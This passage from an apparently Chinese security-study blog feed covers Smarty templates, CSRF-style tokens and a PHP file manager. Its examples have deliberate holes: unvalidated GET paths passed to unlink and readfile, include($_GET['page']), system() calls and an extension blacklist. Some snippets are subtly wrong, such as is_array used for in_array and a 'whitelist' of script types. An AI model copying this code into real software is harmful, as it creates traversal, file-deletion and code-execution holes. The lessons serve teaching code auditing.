class="line"><span class="variable">$smarty</span>-&gt;cache_dir = <span class="string">&#x27;smarty-demo/cache/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;config_dir = <span class="string">&#x27;smarty-demo/configs/&#x27;</span>;</span><br><span class="line"><span class="comment">// 赋值变量到模板中</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;欢迎使用 Smarty&#x27;</span>);</span><br><span class="line"><span class="comment">// 显示模板</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;index.tpl&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4、创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&#123;<span class="variable">$title</span>&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;&#123;<span class="variable">$title</span>&#125;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>1、自写模板    rce安全问题<br>2、第三方模板  没有直接rce安全问题，但也有漏洞</p><blockquote><p>1，本身的代码逻辑漏洞<br>2，第三方插件（ueditor）<br>3，第三方模板（smarty）<br>4，第三方组件（java居多，shiro，fastjson等）</p></blockquote><p>意味着代码审计什么都要审，审代码，审模板，审组件，审插件等。<br>重点：开发角度看待漏洞挖掘。</p><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>cnvd查漏洞，水平越权，垂直越权，逻辑越权</p><h2 id="框架-组件-模板"><a href="#框架-组件-模板" class="headerlink" title="框架-组件-模板"></a>框架-组件-模板</h2><blockquote><p><strong>框架</strong> :核心开发，代码逻辑核心(核心功能的实现)<br><strong>组件</strong> :第三方功能开发 =&gt; 必须考虑的是：是不是涉及敏感函数，操作敏感不？ =&gt; 敏感操作造成漏洞<br><strong>模板</strong> :负责页面美观(用于丰富功能)</p></blockquote><p>框架是核心，组件和模板负责修饰。<br>黑盒：端口扫描 数据包特征 识别插件工具等。=&gt; 识别出框架-组件-模板</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2023版学习-0029</title>
      <link href="/2023/04/13/SEC-Study-0029/"/>
      <url>/2023/04/13/SEC-Study-0029/</url>
      
        <content type="html"><![CDATA[<p>安全开发-PHP-文件管理</p><span id="more"></span><h1 id="token模块核心"><a href="#token模块核心" class="headerlink" title="token模块核心"></a>token模块核心</h1><blockquote><p>注意：<br>1.浏览器的插件可能会影响token的使用，例如插件在你发出请求后重新刷新请求，导致数据包永远是不唯一的。<br>2.token使用的是session的会话维持<br>3.token是唯一的。</p></blockquote><p>我的个人理解：</p><blockquote><p>1.session的会话维持的特性，加入session的值在一定时间内是恒定不变的<br>2.利用生成算法等方式，创建一个唯一的token，并且传递给表单，让表单隐性提交过来<br>3.当表单提交的token值与服务器对不上时(!==)，服务器更新token值。<br>4.当表单正确时，将token再次更新，确保数据包的唯一性。<br>作用：确保数据包的唯一性，相当于强制用户必须使用当前页面登录。<br>(反正每一次访问都会刷新token，并且想要破解token几乎不可能，除非程序员的设计有问题等。)</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 甄别条件从$_POST[&#x27;submit&#x27;]转换为甄别token是否正确</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$token</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// token不匹配，禁止访问</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Access denied&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录成功!&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;你是管理员可以访问文件管理页面！&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="PHP文件管理"><a href="#PHP文件管理" class="headerlink" title="PHP文件管理"></a>PHP文件管理</h1><p>目的：为后期代码审计做铺垫。</p><h2 id="界面设计"><a href="#界面设计" class="headerlink" title="界面设计"></a>界面设计</h2><p>前端部分</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">i</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>当前目录下的文件列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端部分</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 取值，取get结果或者当前目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?? <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.打开目录，读取文件列表 opendir</span></span><br><span class="line"><span class="comment">//2.循环读取文件列表 while readdir</span></span><br><span class="line"><span class="comment">//3.判断是文件还是文件夹 is_dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开目录，读取文件列表 opendir</span></span><br><span class="line"><span class="comment">// 核心代码，也是核心函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filelist</span>(<span class="params"><span class="variable">$dir</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="comment">//循环读取文件列表 while readdir</span></span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">//判断是文件还是文件夹 is_dir</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=<span class="subst">$file</span>&#x27;&gt;&quot;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">filelist</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">del</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">down</span>(<span class="params"><span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="variable">$fileName</span> . <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$filepath</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;down&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">down</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;down&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php.ini文件：</span><br><span class="line">如果不慎关闭这个设置，会导致全局目录遍历漏洞出现。导致本地的所有文件都会被攻击者浏览和下载。</span><br><span class="line">关闭下面设置：形成文件遍历漏洞</span><br><span class="line">open_basedir</span><br><span class="line"></span><br><span class="line">防止被翻目录的方法：使用代码内语法限制，或者打开上面的open_basedir对访问目录进行限制</span><br></pre></td></tr></table></figure><h1 id="黑名单-白名单-文件类型限制"><a href="#黑名单-白名单-文件类型限制" class="headerlink" title="黑名单+白名单+文件类型限制"></a>黑名单+白名单+文件类型限制</h1><h2 id="黑名单白名单"><a href="#黑名单白名单" class="headerlink" title="黑名单白名单"></a>黑名单白名单</h2><p>黑名单：写好不能上传的文件类型。<br>白名单：指定好能上传的文件类型(推荐)。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写好黑名单</span></span><br><span class="line"><span class="comment">// 缺点：变形文件后缀格式绕过，例如php改成php5</span></span><br><span class="line"><span class="variable">$black_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;aps&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>,<span class="string">&#x27;js&#x27;</span>);</span><br><span class="line"><span class="comment">// 拆分上传的文件名</span></span><br><span class="line"><span class="comment">// 用‘ . ’来拆分上传的文件名</span></span><br><span class="line"><span class="variable">$chaifeng</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">// 获取拆分的文件名后缀，当然，只能获取一层后缀</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$chaifeng</span>);</span><br><span class="line"><span class="comment">// 测试后缀是否在黑名单内</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$exts</span>,<span class="variable">$black_ext</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 上传成功后，将文件存储到指定文件夹下</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单和它相反，代码和黑名单差不多</span></span><br><span class="line"><span class="variable">$allow_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;aps&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>,<span class="string">&#x27;js&#x27;</span>);</span><br><span class="line"><span class="comment">// 拆分上传的文件名</span></span><br><span class="line"><span class="comment">// 用‘ . ’来拆分上传的文件名</span></span><br><span class="line"><span class="variable">$chaifeng</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">// 获取拆分的文件名后缀，当然，只能获取一层后缀</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$chaifeng</span>);</span><br><span class="line"><span class="comment">// 测试后缀是否在黑名单内</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$exts</span>,<span class="variable">$allow_ext</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件类型限制"><a href="#文件类型限制" class="headerlink" title="文件类型限制"></a>文件类型限制</h2><p>下面数数据包</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /PHPStorm/demo02-file/upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">63342</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">111.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------5435133931587131946420401364</span></span><br><span class="line"><span class="comment">Content-Length: 82957</span></span><br><span class="line"><span class="comment">Origin: http://localhost:63342</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://localhost:63342/PHPStorm/demo02-file/upload.html</span></span><br><span class="line"><span class="comment">Cookie: trc_cookie_storage=taboola%2520global%253Auser-id%3Df4eeb98c-1ca4-4407-9a33-806360ecfab3-tuctade20dc; Phpstorm-b8aba78c=ded8652c-119a-412b-aa29-d33a3f081b89; PHPSESSID=0sheefdllfhlpouaupbvm9jlka</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------5435133931587131946420401364</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;f&quot;; filename=&quot;腾讯会议图片_20230408214013.jpeg&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/jpeg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">下面是文件内容，省略了</span></span><br></pre></td></tr></table></figure><p>经过观察，可以发现Content-Type指定上传文件的文件类型是image/jpeg。</p><p>安全风险：改下文件类型的数据包就可以了。需要验证逻辑严谨些才能显得安全些。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$type</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="comment">// 白名单mime类型表</span></span><br><span class="line"><span class="variable">$allow_type</span>=<span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>,<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法文件类型&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>() 在错误发生后脚本继续执行</span><br><span class="line">    功能：<span class="string">&#x27;包含&#x27;</span>哪个文件就执行那个文件  </span><br><span class="line">          把任意一个文件调用过来执行。</span><br><span class="line">          =&gt; 任意脚本执行漏洞：如下</span><br><span class="line">          <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">require</span>() 在错误发生后脚本停止执行</span><br><span class="line"><span class="keyword">include_once</span>() 如果已经包含，则不再执行</span><br><span class="line"><span class="keyword">require_once</span>() 如果已经包含，则不再执行</span><br></pre></td></tr></table></figure><h1 id="文件删除："><a href="#文件删除：" class="headerlink" title="文件删除："></a>文件删除：</h1><p>unlink() 文件删除函数<br>调用命令删除：system shell_exec exec等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php调用WindowsCMD删除文件</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;del 1.txt&#x27;</span>);</span><br><span class="line">安全问题：任意命令执行漏洞。</span><br></pre></td></tr></table></figure><h1 id="文件下载："><a href="#文件下载：" class="headerlink" title="文件下载："></a>文件下载：</h1><p>修改HTTP头实现文件读取解析下载：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">header(&quot;</span>Content-<span class="attr">Length</span>: <span class="string">&quot; . filesize(<span class="subst">$file</span>));</span></span><br><span class="line"><span class="string">readfile(<span class="subst">$file</span>);</span></span><br></pre></td></tr></table></figure><h1 id="文件编辑："><a href="#文件编辑：" class="headerlink" title="文件编辑："></a>文件编辑：</h1><p>1、file_get_contents() 读取文件内容<br>2、fopen() fread() 文件打开读入</p><h1 id="文件编辑下载删除实现"><a href="#文件编辑下载删除实现" class="headerlink" title="文件编辑下载删除实现"></a>文件编辑下载删除实现</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;console.log(&#x27;<span class="subst">$fname</span>&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">unlink</span>(<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$fname</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1:8028/all_file_read-x.php?path=<span class="subst">$path</span>&quot;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;http://127.0.0.1:8028/all_file_read-x.php?path=<span class="subst">$path</span>&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;down&#x27;</span>:</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment;filename=\&quot;&quot;</span>.<span class="variable">$fname</span>.<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$fname</span>));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">      <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$fname</span>&quot;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;all_file_read-x.php&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;文件名：&quot;</span>.<span class="variable">$fname</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;文件内容：&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;textarea name=&quot;codes&quot; style=&quot;resize:none;&quot; rows=&quot;100&quot; cols=&quot;100&quot;&quot;&gt;&#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;&lt;/textarea&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; value=&#x27;<span class="subst">$path</span>/<span class="subst">$fname</span>&#x27; name=&#x27;pf&#x27;&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;codes&#x27;</span>]))&#123;</span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pf&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;codes&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0002-域名/DNS/数据包</title>
      <link href="/2023/04/12/SEC-Study-0028/"/>
      <url>/2023/04/12/SEC-Study-0028/</url>
      
